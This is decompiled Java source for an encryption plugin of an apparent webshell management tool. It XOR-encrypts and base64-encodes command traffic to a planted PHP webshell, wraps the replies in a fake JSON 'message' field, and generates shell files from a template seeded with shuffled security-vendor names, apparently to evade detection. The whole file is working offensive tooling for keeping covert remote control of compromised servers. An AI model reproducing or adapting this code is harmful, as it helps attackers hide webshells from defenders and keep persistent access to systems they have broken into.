//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
        Name = "PHP_XOR_BASE64_MESSAGES",
        payloadName = "PhpDynamicPayload"
)
public class PhpXormessage implements Cryption {
    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private String findStrLeft;
    private String findStrRight;
    private String changshangyi;
    //private String changshangyi = "aaaaa";

    public PhpXormessage() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        //this.findStrLeft = findStrMd5.substring(0, 16);
        //this.findStrRight = findStrMd5.substring(16);
        this.findStrLeft = "{\"message\":\"";
        this.findStrRight = "\"}";

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Exception e = var4;
            Log.error(e);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Exception e = var3;
            Log.error(e);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Exception e = var3;
                Log.error(e);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

//    @Override
//    public byte[] generate(String s, String s1) {
//        return new byte[0];
//    }

    public byte[] E(byte[] cs) {
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
    }

    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return cs;
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

//    public byte[] generate(String password, String secretKey) {
//        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream("template/xorbase64message.bin")))).replace("{pass}", functions.base64EncodeToString(password.getBytes())).replace("{secretKey}", functions.base64EncodeToString(functions.md5(secretKey).substring(0, 16).getBytes())).getBytes();
//    }


//    public byte[] generate(String password, String secretKey) {
//        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
//    }
//    private static Random rand = new Random();
//    public static <T> void swap(T[] a, int i, int j) {
//        T temp = a[i];
//        a[i] = a[j];
//        a[j] = temp;
//    }
//
//    public static <T> void shuffle(T[] arr) {
//        int length = arr.length;
//        for (int i = length; i > 0; i--) {
//            int randInd = rand.nextInt(i);
//            swap(arr, randInd, i - 1);
//        }
//    }


    public byte[] generate(String password, String secretKey) {
        String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec",
                "venustech","asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei"};
        shuffle(arr);
        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream("template/xorbase64message.bin"))))
                .replace("{pass}", functions.base64EncodeToString(password.getBytes()))
                .replace("{secretKey}", functions.base64EncodeToString(functions.md5(secretKey).substring(0, 16).getBytes()))
                .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                .getBytes();
    }
    private static Random rand = new Random();

    public static <T> void swap(T[] a, int i, int j) {
        T temp = a[i];
        a[i] = a[j];
        a[j] = temp;
    }

    public static <T> void shuffle(T[] arr) {
        int length = arr.length;
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            swap(arr, randInd, i - 1);
        }
        }

}
